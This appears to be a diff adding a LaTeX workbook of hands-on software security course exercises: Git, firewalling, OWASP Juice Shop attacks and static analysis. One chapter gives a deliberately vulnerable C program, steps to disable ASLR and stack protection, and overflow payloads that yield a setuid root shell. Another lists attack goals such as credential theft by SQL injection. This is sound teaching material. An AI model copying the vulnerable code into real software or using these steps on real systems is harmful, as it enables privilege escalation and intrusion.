@@ -1,0 +1,1316 @@
+\documentclass[a4paper,11pt,notitlepage]{report}
+% Henrik Kramselund Jereminsen, February 2001
+% hlk@security6.net,
+% My standard packages
+\usepackage{zencurity-network-exercises}
+
+\begin{document}
+
+\rm
+\selectlanguage{english}
+
+\newcommand{\subject}[1]{Software Security course}
+\newcommand{\kursus}[1]{Software Security course}
+\newcommand{\kursusnavn}[1]{Software Security course\\ exercises}
+
+\mytitle{Software Security Exercises}
+{Introduction to IT-Security;\\Dat21 Introduction to IT Security 2023 Week 6}
+
+\pagenumbering{roman}
+
+\setcounter{tocdepth}{0}
+
+\normal
+
+{\color{titlecolor}\tableofcontents}
+%\listoffigures - not used
+%\listoftables - not used
+
+\normal
+\pagestyle{fancyplain}
+\chapter*{\color{titlecolor}Preface}
+\markboth{Preface}{}
+
+This material is prepared for use in \emph{\kursus} and was prepared by
+Henrik Kramselund Jereminsen, \link{http://www.zencurity.com} .
+It describes the networking setup and
+applications for trainings and courses where hands-on exercises are needed.
+
+Further a presentation is used which is available as PDF from kramse@Github\\
+Look for \jobname in the repo security-courses.
+
+These exercises are expected to be performed in a training setting with network connected systems. The exercises use a number of tools which can be copied and reused after training. A lot is described about setting up your workstation in the repo
+
+\link{https://github.com/kramse/kramse-labs}
+
+
+\section*{\color{titlecolor}Prerequisites}
+
+This material expect that participants have a working knowledge of
+TCP/IP from a user perspective. Basic concepts such as web site addresses and email should be known as well as IP-addresses and common protocols like DHCP.
+
+\vskip 1cm
+Have fun and learn
+\eject
+
+% =================== body of the document ===============
+% Arabic page numbers
+\pagenumbering{arabic}
+\rhead{\fancyplain{}{\bf \chaptername\ \thechapter}}
+
+% Main chapters
+%---------------------------------------------------------------------
+% gennemgang af emnet
+% check questions
+
+\chapter*{\color{titlecolor}Exercise content}
+\markboth{Exercise content}{}
+
+Most exercises follow the same procedure and has the following content:
+\begin{itemize}
+\item {\bf Objective:} What is the exercise about, the objective
+\item {\bf Purpose:} What is to be the expected outcome and goal of doing this exercise
+\item {\bf Suggested method:} suggest a way to get started
+\item {\bf Hints:} one or more hints and tips or even description how to
+do the actual exercises
+\item {\bf Solution:} one possible solution is specified
+\item {\bf Discussion:} Further things to note about the exercises, things to remember and discuss
+\end{itemize}
+
+Please note that the method and contents are similar to real life scenarios and does not detail every step of doing the exercises. Entering commands directly from a book only teaches typing, while the exercises are designed to help you become able to learn and actually research solutions.
+
+
+\chapter{\faExclamationTriangle\ Git tutorials - 15min}
+\label{ex:git-tutorial}
+
+
+\hlkimage{3cm}{git-logo.png}
+
+{\bf Objective:}\\
+Try the program Git locally on your workstation
+
+{\bf Purpose:}\\
+Running Git will allow you to clone repositories from others easily. This is a great way to get new software packages, and share your own.
+
+Git is the name of the tool, and Github is a popular site for hosting git repositories.
+
+{\bf Suggested method:}\\
+Run the program from your Linux VM. You can also clone from your Windows or Mac OS X computer. Multiple graphical front-end programs exist too.
+
+
+First make sure your system is updated, as root run:
+
+\begin{minted}[fontsize=\footnotesize]{shell}
+sudo apt-get update && apt-get -y upgrade && apt-get -y dist-upgrade
+\end{minted}
+You should reboot if the kernel is upgraded :-)
+
+Second make sure your system has Git, ansible and my playbooks: (as root run, or with sudo as shown)
+\begin{minted}[fontsize=\footnotesize]{shell}
+sudo apt -y install ansible git
+\end{minted}
+
+
+Most important are Git clone and pull:
+\begin{alltt}\footnotesize
+user@Projects:tt$ {\bf git clone https://github.com/kramse/kramse-labs.git}
+Cloning into 'kramse-labs'...
+remote: Enumerating objects: 283, done.
+remote: Total 283 (delta 0), reused 0 (delta 0), pack-reused 283
+Receiving objects: 100% (283/283), 215.04 KiB | 898.00 KiB/s, done.
+Resolving deltas: 100% (145/145), done.
+
+user@Projects:tt$ {\bf cd kramse-labs/}
+
+user@Projects:kramse-labs$ {\bf ls}
+LICENSE  README.md  core-net-lab  lab-network  suricatazeek  work-station
+user@Projects:kramse-labs$ git pull
+Already up to date.
+\end{alltt}
+
+If you want to install the Atom editor, you can run the Ansible playbook from the workstation directory.
+
+Then run it with:
+\begin{minted}[fontsize=\footnotesize]{shell}
+cd ~/kramse-labs/workstation
+ansible-playbook -v 1-dependencies.yml
+\end{minted}
+
+
+
+{\bf Hints:}\\
+Browse the Git tutorials on \link{https://git-scm.com/docs/gittutorial}\\
+and \link{https://guides.github.com/activities/hello-world/}
+
+We will not do the whole tutorials within 15 minutes, but get an idea of the command line, and see examples. Refer back to these tutorials when needed or do them at home.
+
+Note: you don't need an account on Github to download/clone repositories, but having an acccount allows you to save repositories yourself and is recommended.
+
+{\bf Solution:}\\
+When you have tried the tool and seen the tutorials you are done.
+
+{\bf Discussion:}\\
+Before Git there has been a range of version control systems,\\
+see \link{https://en.wikipedia.org/wiki/Version\_control} for more details.
+
+
+
+\chapter{Enable UFW firewall - 10 min}
+\label{ex:debian-firewall}
+
+{\bf Objective:}\\
+Turn on a firewall and configure a few simple rules.
+
+Only do this exercise if you have access to a Debian or Linux distribution with \verb+ufw+
+
+{\bf Purpose:}\\
+See how easy it is to restrict incoming connections to a server.
+
+
+{\bf Suggested method:}\\
+Install a utility for firewall configuration.
+
+You could also perform Nmap port scan with the firewall enabled and disabled.
+
+{\bf Hints:}\\
+Using the ufw package it is very easy to configure the firewall on Linux.
+
+Install and configuration can be done using these commands.
+\begin{alltt}
+root@debian01:~# apt install ufw
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  ufw
+0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
+Need to get 164 kB of archives.
+After this operation, 848 kB of additional disk space will be used.
+Get:1 http://mirrors.dotsrc.org/debian stretch/main amd64 ufw all 0.35-4 [164 kB]
+Fetched 164 kB in 2s (60.2 kB/s)
+...
+root@debian01:~# ufw allow 22/tcp
+Rules updated
+Rules updated (v6)
+root@debian01:~# ufw enable
+Command may disrupt existing ssh connections. Proceed with operation (y|n)? y
+Firewall is active and enabled on system startup
+root@debian01:~# ufw status numbered
+Status: active
+
+     To                         Action      From
+     --                         ------      ----
+[ 1] 22/tcp                     ALLOW IN    Anywhere
+[ 2] 22/tcp (v6)                ALLOW IN    Anywhere (v6)
+\end{alltt}
+
+Also allow port 80/tcp and port 443/tcp - and install a web server. Recommend Nginx \verb+apt-get install nginx+
+
+{\bf Solution:}\\
+When firewall is enabled and you can still connect to Secure Shell (SSH) and web service, you are done.
+
+{\bf Discussion:}\\
+Further configuration would often require adding source prefixes which are allowed to connect to specific services. If this was a database server the database service should probably not be reachable from all of the Internet.
+
+Web interfaces also exist, but are more suited for a centralized firewall.
+
+Configuration of this firewall can be done using ansible, see the documentation and examples at \url{https://docs.ansible.com/ansible/latest/modules/ufw_module.html}
+
+Should you have both a centralized firewall in front of servers, and local firewall on each server? Discuss within your team.
+
+
+\chapter{\faExclamationTriangle\ Run OWASP Juice Shop 45 min}
+\label{ex:sw-startjuice}
+
+\hlkimage{3cm}{JuiceShop_Logo_100px.png}
+
+{\bf Objective:}\\
+Lets try starting the OWASP Juice Shop
+
+{\bf Purpose:}\\
+We will be doing some web hacking where you will be the hacker. There
+will be an application we try to hack, designed to
+optimise your learning.
+
+It is named JuiceShop which is written in JavaScript
+
+{\bf Suggested method:}\\
+Go to \link{https://github.com/bkimminich/juice-shop}
+
+Read the instructions for running juice-shop - docker is a simple way.
+
+What you need
+
+You need to have browsers and a proxy, plus a basic knowledge of HTTP.
+
+If you could install Firefox it would be great, and we will use the
+free version of Burp Suite, so please make sure you can run Java and
+download the free version from Portswigger from:
+
+\link{https://portswigger.net/burp/communitydownload}
+
+
+{\bf Hints:}\\
+The application is very modern, very similar to real applications.
+
+The Burp proxy is an advanced tool! Dont be scared, we will use small parts at different times.
+
+JuiceShop can be run as a docker, and sometimes running it on Kali is the easiest learning environment.
+
+{\bf Solution:}\\
+When you have a running Juice Shop web application in your team, then we are good.
+
+{\bf Discussion:}\\
+It has lots of security problems which can be used for learning
+hacking, and thereby how to secure your applications. It is  related
+to the OWASP.org Open Web Application Security Project which also has a
+lot of resources.
+
+Sources:\\
+\url{https://github.com/bkimminich/juice-shop}\\
+\url{https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project}
+
+It is recommended to buy the \emph{Pwning OWASP Juice Shop Official companion guide to the OWASP Juice Shop} from \link{https://leanpub.com/juice-shop} - suggested price USD 5.99
+
+
+
+\chapter{Setup JuiceShop environment, app and proxy - up to 60min}
+\label{ex:js-burp}
+
+{\bf Objective:}\\
+Run JuiceShop with Burp proxy.
+
+Start JuiceShop and make sure it works, visit using browser.
+
+Then add a web proxy in-between. We will use Burp suite which is a commercial product, in the community edition.
+
+{\bf Purpose:}\\
+We will learn more about web applications as they are a huge part of the applications used in enterprises and on the internet. Most mobile apps are also web applications in disguise.
+
+By inserting a web proxy we can inspect the data being sent between browsers and the application.
+
+{\bf Suggested method:}\\
+You need to have browsers and a proxy, plus a basic knowledge of HTTP.
+
+If you could install Firefox it would be great, and we will use the
+free version of Burp Suite, so please make sure you can run Java and
+download the free version \emph{plain JAR file} from Portswigger from:
+
+\link{https://portswigger.net/burp/communitydownload}
+
+follow the Getting Started instructions at:\\
+\link{https://support.portswigger.net/customer/portal/articles/1816883-getting-started-with-burp-suite}
+
+
+{\bf Hints:}\\
+Recommend running Burp on the default address and port 127.0.0.1 port 8080.
+
+Note: Burp by default has \verb+intercept is on+ in the Proxy tab, press the button to allow data to flow.
+
+\hlkimage{10cm}{burp-default-proxy-intercept.png}
+
+Then setting it as proxy in Firefox:
+
+\hlkimage{10cm}{firefox-connection-burp.png}
+
+After setting up proxy, you can visit \url{http://burp} and get a CA certificate that can be installed, making it easier to run against HTTPS sites.
+
+The newest versions of Burp include a browser, making it much easier to run the tasks, pre-configured with proxy.
+
+{\bf Solution:}\\
+When web sites and servers start popping up in the Target tab, showing the requests and responses - you are done.
+
+Your browser will alert you when visiting TLS enabled sites, HTTPS certificates do not match, as Burp is doing a person-in-the-middle. You need to select advanced and allow this to continue.
+
+{\bf Discussion:}\\
+Since Burp is often updated I use a small script for starting Burp which I save in \verb+~/bin/burp+ - dont forget to add to PATH and \verb+chmod +x bin/burp+.
+
+\begin{alltt}
+#! /bin/sh
+DIRNAME=`dirname $0`
+BURP=`ls -1tra $DIRNAME/burp*.jar | tail -1`
+java -jar -Xmx6g $BURP &
+\end{alltt}
+
+When running in production testing real sites, I typically increase the memory available using JDK / Java settings like \verb+-Xmx16g+
+
+
+
+\chapter{Optional: See parts of a Django tutorial 30min}
+\label{ex:django-intro}
+
+{\bf Objective:}\\
+Talk about web applications, how they are made.
+
+{\bf Purpose:}\\
+Know how you can get started using a framework, like Django\\ \link{https://www.djangoproject.com/}
+
+{\bf Suggested method:}\\
+We will visit a Django tutorial and talk about the benefits from using existing frameworks.
+
+{\bf Hints:}\\
+Input validation is a problem most applications face. Using Django a lot of functionality is available for input validation.
+
+Take a look at Form and field validation:\\
+\link{https://docs.djangoproject.com/en/2.2/ref/forms/validation/}
+
+You can also write your own validators, and should centralize validation in your own applications.
+
+\begin{minted}[fontsize=\small]{python}
+
+  from django.core.exceptions import ValidationError
+  from django.utils.translation import gettext_lazy as _
+
+  def validate_even(value):
+      if value % 2 != 0:
+          raise ValidationError(
+              _('%(value)s is not an even number'),
+              params={'value': value},
+          )
+\end{minted}
+
+Example from:
+\link{https://docs.djangoproject.com/en/2.2/ref/validators/}
+
+{\bf Solution:}\\
+When we have covered basics of what Django is, what frameworks provide and seen examples, we are done.
+
+{\bf Discussion:}\\
+Django is only an example, other languages and projects exist.
+
+
+\chapter{Demo: Buffer Overflow 101 - 30-40min}
+\label{ex:bufferoverflow}
+
+
+{\bf Objective:}\\
+Run a demo program with invalid input - too long.
+
+{\bf Purpose:}\\
+See how easy it is to cause an exception.
+
+{\bf Suggested method:}\\
+Running on a modern Linux has a lot of protection, making it hard to exploit. Using a Raspberry Pi instead makes it quite easy. Choose what you have available.
+
+Using another processor architecture like MIPS or ARM creates other problems.
+
+\begin{list2}
+\item Small demo program \verb+demo.c+
+\item Has built-in shell code, function \verb+the_shell+
+\item Compile:
+\verb+gcc -o demo demo.c+
+\item Run program
+\verb+./demo test+
+\item Goal: Break and insert return address
+\end{list2}
+
+\begin{minted}[fontsize=\footnotesize]{c}
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main(int argc, char **argv)
+{      char buf[10];
+        strcpy(buf, argv[1]);
+        printf("%s\n",buf);
+}
+int the_shell()
+{  system("/bin/dash");  }
+\end{minted}
+
+NOTE: this demo is using the dash shell, not bash - since bash drops privileges and won't work.
+
+Use GDB to repeat the demo by the instructor.
+
+{\bf Hints:}\\
+First make sure it compiles:
+\begin{alltt}
+\$ gcc -o demo demo.c
+\$ ./demo hejsa
+hejsa
+\end{alltt}
+
+Make sure you have tools installed:
+\begin{alltt}
+apt-get install gdb
+\end{alltt}
+
+Then run with debugger:
+
+\begin{alltt}
+\$ gdb demo
+GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from demo...(no debugging symbols found)...done.
+(gdb) {\bf
+(gdb) run `perl -e "print 'A'x22; print 'B'; print 'C'"`}
+Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
+AAAAAAAAAAAAAAAAAAAAAABC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000434241414141 in ?? ()
+(gdb)
+// OR
+(gdb) {\bf
+(gdb) run $(perl -e "print 'A'x22; print 'B'; print 'C'")}
+Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
+AAAAAAAAAAAAAAAAAAAAAABC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000434241414141 in ?? ()
+(gdb)
+
+\end{alltt}
+
+Note how we can see the program trying to jump to address with our data. Next step would be to make sure the correct values end up on the stack.
+
+{\bf Solution:}\\
+When you can run the program with debugger as shown, you are done.
+
+{\bf Discussion:}\\
+
+the layout of the program - and the address of the \verb+the_shell+ function can be seen using the command \verb+nm+:
+\begin{alltt}\footnotesize
+\$ nm demo
+0000000000201040 B __bss_start
+0000000000201040 b completed.6972
+                 w __cxa_finalize@@GLIBC_2.2.5
+0000000000201030 D __data_start
+0000000000201030 W data_start
+0000000000000640 t deregister_tm_clones
+00000000000006d0 t __do_global_dtors_aux
+0000000000200de0 t __do_global_dtors_aux_fini_array_entry
+0000000000201038 D __dso_handle
+0000000000200df0 d _DYNAMIC
+0000000000201040 D _edata
+0000000000201048 B _end
+0000000000000804 T _fini
+0000000000000710 t frame_dummy
+0000000000200dd8 t __frame_dummy_init_array_entry
+0000000000000988 r __FRAME_END__
+0000000000201000 d _GLOBAL_OFFSET_TABLE_
+                 w __gmon_start__
+000000000000081c r __GNU_EH_FRAME_HDR
+00000000000005a0 T _init
+0000000000200de0 t __init_array_end
+0000000000200dd8 t __init_array_start
+0000000000000810 R _IO_stdin_used
+                 w _ITM_deregisterTMCloneTable
+                 w _ITM_registerTMCloneTable
+0000000000200de8 d __JCR_END__
+0000000000200de8 d __JCR_LIST__
+                 w _Jv_RegisterClasses
+0000000000000800 T __libc_csu_fini
+0000000000000790 T __libc_csu_init
+                 U __libc_start_main@@GLIBC_2.2.5
+0000000000000740 T main
+                 U puts@@GLIBC_2.2.5
+0000000000000680 t register_tm_clones
+0000000000000610 T _start
+                 U strcpy@@GLIBC_2.2.5
+                 U system@@GLIBC_2.2.5
+000000000000077c T the_shell
+0000000000201040 D __TMC_END__
+\end{alltt}
+
+The bad news is that this function is at an address \verb+000000000000077c+ which is hard to input using our buffer overflow, please try \smiley We cannot write zeroes, since strcpy stop when reaching a null byte.
+
+We can compile our program as 32-bit using this, and disable things like ASLR, stack protection also:
+\begin{alltt}
+sudo apt-get install gcc-multilib
+sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
+gcc -m32 -o demo demo.c -fno-stack-protector -z execstack -no-pie
+\end{alltt}
+
+Then you can produce 32-bit executables:
+\begin{alltt}\footnotesize
+// Before:
+user@debian-9-lab:~/demo$ file demo
+demo: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=82d83384370554f0e3bf4ce5030f6e3a7a5ab5ba, not stripped
+// After - 32-bit
+user@debian-9-lab:~/demo$ gcc -m32 -o demo demo.c
+user@debian-9-lab:~/demo$ file demo
+demo: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5fe7ef8d6fd820593bbf37f0eff14c30c0cbf174, not stripped
+\end{alltt}
+
+And layout:
+\begin{alltt}\footnotesize
+0804a024 B __bss_start
+0804a024 b completed.6587
+0804a01c D __data_start
+0804a01c W data_start
+...
+080484c0 T the_shell
+0804a024 D __TMC_END__
+080484eb T __x86.get_pc_thunk.ax
+080483a0 T __x86.get_pc_thunk.bx
+\end{alltt}
+
+
+Successful execution would look like this - from a Raspberry Pi:
+\begin{alltt}\footnotesize
+\$ gcc -o demo demo.c
+\$ nm demo | grep the_shell
+000104ec T the_shell
+\$
+
+...
+(gdb) run `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/pi/demo/demo `perl -e " print 'A'x16; print chr(0xec) . chr(04)  . chr (0x01);" `
+AAAAAAAAAAAAAAAA
+\$
+\end{alltt}
+
+Started a new shell.
+
+you can now run the "exploit" - which is the shell function AND the misdirection of the instruction flow by overflow:
+\begin{alltt}\footnotesize
+pi@raspberrypi:~/demo $ gcc -o demo demo.c
+pi@raspberrypi:~/demo $ sudo chown root.root demo
+pi@raspberrypi:~/demo $ sudo chmod +s demo
+pi@raspberrypi:~/demo $ id
+uid=1000(pi) gid=1000(pi) grupper=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
+pi@raspberrypi:~/demo $ ./demo `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
+AAAAAAAAAAAAAAAA
+# id
+uid=1000(pi) gid=1000(pi) euid=0(root) egid=0(root) grupper=0(root),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi),1000(pi)
+#
+
+\end{alltt}
+
+
+
+\chapter{\faExclamationTriangle\ Real Vulnerabilities up to 30min}
+\label{ex:real-vulns}
+
+
+
+{\bf Objective:}\\
+Look at real vulnerabilities. Choose a few real vulnerabilities, prioritize them.
+
+{\bf Purpose:}\\
+See that the error types described in the books - are still causing problems.
+
+
+
+{\bf Suggested method:}\\
+We will use the 2019 Exim errors as examples. Download the descriptions from:
+\begin{list2}
+\item Exim RCE CVE-2019-10149 June\\ \url{https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt}
+
+\item Exim RCE CVE-2019-15846 September\\
+\url{https://exim.org/static/doc/security/CVE-2019-15846.txt}
+\end{list2}
+
+When done with these think about your own dependencies. What software do you depend on? How many vulnerabilities and CVEs are for that?
+
+Microsoft has \emph{patch tuesdays} which are announced days with releases of patches for their products. An example is \link{https://msrc.microsoft.com/update-guide/releaseNote/2023-Jan} .
+
+
+I depend on the OpenBSD operating system, and it has flaws too:\\
+\url{https://www.openbsd.org/errata65.html}
+
+You may depend on OpenSSH from the OpenBSD project, which has had a few problems too:\\
+\url{https://www.openssh.com/security.html}
+
+{\bf Hints:}\\
+Remote Code Execution can be caused by various things, but most often some kind of input validation failure.
+
+{\bf Solution:}\\
+When you have identified the specific error type, is it buffer overflows? Then you are done.
+
+{\bf Discussion:}\\
+How do you feel about running internet services. Lets discuss how we can handle running insecure code.
+
+What other methods can we use to restrict problems caused by similar vulnerabilities.
+
+A new product will often use a generic small computer and framework with security problems.
+
+
+
+
+
+
+
+\chapter{\faExclamationTriangle\ JuiceShop Attacks 60min}
+\label{ex:juiceshop-attack}
+
+\hlkimage{2cm}{JuiceShop_Logo_100px.png}
+
+ {\bf Objective:}\\
+Hack a web application!
+
+Try a few attacks in the JuiceShop
+
+\begin{quote}
+The OWASP Juice Shop is a pure web application implemented in JavaScript. In the
+frontend the popular AngularJS framework is used to create a so-called Single Page
+Application. The user interface layout is provided by Twitter's Bootstrap framework - which
+works nicely in combination with AngularJS.
+JavaScript is also used in the backend as the exclusive programming language: An Express
+application hosted in a Node.js server delivers the client-side code to the browser. It also
+provides the necessary backend functionality to the client via a RESTful API.
+
+...
+
+The vulnerabilities found in the OWASP Juice Shop are categorized into several different
+classes. Most of them cover different risk or vulnerabiliy types from well-known lists or
+documents, such as OWASP Top 10 or MITRE's Common Weakness Enumeration. The
+following table presents a mapping of the Juice Shop's categories to OWASP and CWE
+(without claiming to be complete).
+\end{quote}
+
+\hlkimage{10cm}{juiceshop-mappings.png}
+Source: \emph{Pwning OWASP Juice Shop}
+
+
+ {\bf Purpose:}\\
+ Try out some of the described web application flaws in a controlled environment. See how an attacker would be able to gather information and attack through HTTP, browser and proxies.
+
+ {\bf Suggested method:}\\
+Start the web application, start Burp or another proxy - start your browser.
+
+Access the web application through your browser and get a feel for how it works. First step is to register your user, before you can shop.
+
+Dont forget to use web developer tools like the JavaScript console!
+
+Then afterwards find and try to exploit vulnerabilities, using the book from Björn and starting with some easy ones:
+
+Suggested list of starting vulns:
+\begin{list2}
+\item Admin Section Access the Admin Section
+\item Error handling Provoke and error
+\item Forged Feedback Post some feedback in another users name.
+\item Access a confidential document
+\item Forgotten Sales Backup Access a salesman's forgotten backup file.
+\item Retrieve a list of all user credentials via SQL Injection
+\end{list2}
+
+We might not have time to go through all of them. Just realize this small application has many vulnerabilities.
+
+
+ {\bf Hints:}\\
+ The complete guide \emph{Pwning OWASP Juice Shop}
+written by Björn Kimminich is available as PDF which you can buy, or you can read it online at:\\
+\url{https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/}
+
+ {\bf Solution:}\\
+ You decide for how long you want to play with JuiceShop.
+
+ Do know that some attackers on the internet spend all their time researching, exploiting and abusing web applications.
+
+ {\bf Discussion:}\\
+The vulnerabilities contained in systems like JuiceShop mimic real ones, and do a very good job. You might not think this is possible in real applications, but there is evidence to the contrary.
+
+Using an app like JS instead of real applications with flaws allow you to spend less on installing apps, and more on exploiting.
+
+
+
+\chapter{Optional: Postman API Client 20 min}
+\label{ex:postman-api}
+
+%\hlkimage{10cm}{kali-linux.png}
+
+{\bf Objective:}\\
+Get a program capable of sending REST HTTP calls installed.
+
+
+{\bf Purpose:}\\
+Debugging REST is often needed, and some tools like Elasticsearch is both configured and maintained using REST APIs.
+
+{\bf Suggested method:}\\
+Download the app from
+\link{https://www.postman.com/downloads/}
+
+Available for Windows, Mac and Linux.
+
+{\bf Hints:}\\
+Download the Linux 64-bit version on your Debian.
+
+Unpack using something like:
+\begin{alltt}
+cd ~;mkdir bin;cd bin
+tar zxvf ~/Downloads/Postman-linux*
+cd Postman;./Postman
+\end{alltt}
+
+You can run the application without signing in anywhere.
+
+{\bf Solution:}\\
+When you have performed a REST call from within this tool, you are done.
+
+Example: use the fake site \link{https://jsonplaceholder.typicode.com/todos/1} and other similar methods from the same (fake) REST API
+
+{\bf Discussion:}\\
+Multiple applications and plugins can perform similar functions. This is a standalone app.
+
+
+
+\chapter{Demo: Small programs with data types 15min}
+\label{ex:c-types}
+
+{\bf Objective:}\\
+Try out small programs similar to:
+\inputminted{c}{programs/int1.c}
+
+\begin{alltt}
+user@Projects:programs$ gcc -o int1 int1.c && ./int1
+First debug int is 32767
+Second debug int is now -32768
+\end{alltt}
+
+{\bf Purpose:}\\
+See actual overflows when going above the maximum for the selected types.
+
+
+{\bf Suggested method:}\\
+Compile program as is. Run it. See the problem.
+
+Then try changing the int type, try with signed and unsigned. Note differences
+
+{\bf Hints:}\\
+Use a calculator to find the maximum, like $2^{16}$, $2^{32}$ etc.
+
+{\bf Solution:}\\
+When you have tried adding one to a value and seeing it going negative, you are done.
+
+{\bf Discussion:}\\
+
+
+\chapter{Secure Coding, Pointers and Structure padding 30min}
+\label{ex:structure-padding}
+
+{\bf Objective:}\\
+Look at some real code from Suricata and Zeek, note how they prevent structure padding.
+
+{\bf Purpose:}\\
+These software applications usually used for security dissect raw packets, which cannot be trusted.
+
+{\bf Suggested method:}\\
+Download the source for some software - either of :
+\begin{list2}
+\item Zeek from \url{https://zeek.org/get-zeek/}
+\item Suricata from \url{https://www.openinfosecfoundation.org/download/}
+\end{list2}
+
+Unpack using \verb+tar zxf+ and use an editor to look up DNS or other packets.
+
+{\bf Hints:}\\
+DNS is a complex protocol, but looking at the header files should give you an idea. Try going into \verb+src+ and doing \verb+less *dns*.h+ or use an editor.
+
+
+{\bf Solution:}\\
+When you have seen the code for a few \verb+struct+ you are done.
+
+If you notice structs with \verb+__attribute__((__packed__))+. Note: This ensures that structure fields align on one-byte boundaries - on all architectures.
+
+Maybe also investigate the rest of the file \verb+decode-vxlan.c+ if you downloaded Suricata.
+
+{\bf Discussion:}\\
+Manual for Gnu C Compiler Collection can be found at:\\
+\url{https://gcc.gnu.org/onlinedocs/gcc-5.2.0/gcc/Type-Attributes.html}
+
+
+\begin{quote}
+packed\\
+This attribute, attached to struct or union type definition, specifies that each member (other than zero-width bit-fields) of the structure or union is placed to minimize the memory required. When attached to an enum definition, it indicates that the smallest integral type should be used.
+\end{quote}
+
+Bonus, can we find some structs missing this?
+
+
+
+
+\chapter{Trying PMD static analysis 30 min}
+\label{ex:pmd-static}
+
+{\bf Objective:}\\
+Try the program PMD locally on your workstation
+
+This exercise requires you to have a Java VM, below are the commands for a Debian Linux to install this YMMV.
+
+
+{\bf Purpose:}\\
+Running PMD will allow you to use static analysis for code.
+
+{\bf Suggested method:}\\
+Run the program from your Debian Linux VM, this tool is free and easy to get running. It uses Java, so if you like run it on your Windows or Mac instead.
+
+Follow instructions from the Getting Started\\
+\url{https://pmd.github.io/latest/pmd_userdocs_installation.html}
+
+The download is from latest, so check the releases page: \link{https://github.com/pmd/pmd/releases}
+
+\begin{alltt}\footnotesize
+$ sudo apt install openjdk-17-jre
+$ cd $HOME
+$ wget https://github.com/pmd/pmd/releases/download/pmd_releases/6.49.0/pmd-bin-6.49.0.zip
+$ unzip pmd-bin-6.49.0.zip
+$ alias pmd="$HOME/pmd-bin-6.49.0/bin/run.sh pmd"
+$
+\end{alltt}
+
+Note: this only creates the alias \verb+pmd+ for this session. To make this more permanent, you could add this to a profile like \verb+.bashrc+
+
+Next get some source code and run PMD:
+\begin{alltt}\footnotesize
+$ git clone --branch rel/2.17.2 https://gitbox.apache.org/repos/asf/logging-log4j2.git
+... downloads the source code for log4j
+$ pmd -d logging-log4j2 -R rulesets/java/quickstart.xml -f text
+\end{alltt}
+
+
+{\bf Hints:}\\
+PMD uses Java, so there should be a JDK/JRE on the system, I install the one from OpenJDK above.
+
+You may need to adjust the version numbers for the JDK/JRE, PMD and select another version of log4j to download.
+
+{\bf Solution:}\\
+When you have gotten a run of PMD going, you are done.
+
+{\bf Discussion:}\\
+Doing the above probably output more than 4500 lines from the PMD program!
+
+How would you proceed?
+
+There seem to be some tedious, but easy to fix, like \emph{Unused import} -- importing some library which is not really used. Things like \emph{empty method}, \emph{empty catch block} etc. may be source missing.
+
+First time use of a new tool will probably find a LOT.
+
+If you are using Maven you could also use their reporting\\
+\link{https://maven.apache.org/plugins/maven-pmd-plugin/project-reports.html}
+%If you like also check out this OWASP document about JSP and Java\\
+%\link{https://owasp.org/www-chapter-belgium/assets/2013/2013-06-06/Securing_Development_with_PMD_-_Teaching_an_Old_Dog_New_Tricks_-_OWASP.pdf}
+
+
+
+
+\chapter{Git hook 30 min}
+\label{ex:git-hook}
+
+{\bf Objective:}\\
+Try using a Git hook locally on your workstation, to prevent something.
+
+
+{\bf Purpose:}\\
+Running Git with hooks will allow you to perform actions when adding source code. For security we can prevent you from adding something to the source tree which breaks policies we agreed.
+
+First read the documentation:\\
+\link{https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks}
+
+
+Note: today we only use client side hooks, for better security we should add hooks on the server side.
+
+Using our existing repository:
+\begin{alltt}\footnotesize
+user@Projects:projects$ {\bf git clone https://github.com/kramse/kramse-labs.git}
+Cloning into 'kramse-labs'...
+user@Projects:projects$ {\bf cd kramse-labs/}
+user@Projects:kramse-labs$ {\bf cd .git/hooks}
+user@Projects:kramse-labs/.git/hooks$ {\bf cat pre-commit.sample}
+// Look at this file, and activate it using:
+user@Projects:kramse-labs/.git/hooks$ {\bf cp pre-commit.sample pre-commit}
+\end{alltt}
+
+Back in the repository try adding a new file with bad name:
+
+\begin{alltt}\footnotesize
+user@Projects:kramse-labs$ {\bf }
+user@Projects:kramse-labs$ touch henrikÆØÅ
+user@Projects:kramse-labs$ git add henrikÆØÅ
+user@Projects:kramse-labs$ git commit -m "Adding henrikÆØÅ"
+Error: Attempt to add a non-ASCII file name.
+This can cause problems if you want to work with people on other platforms.
+To be portable it is advisable to rename the file.
+
+If you know what you are doing you can disable this check using:
+  git config hooks.allow
+\end{alltt}
+
+
+
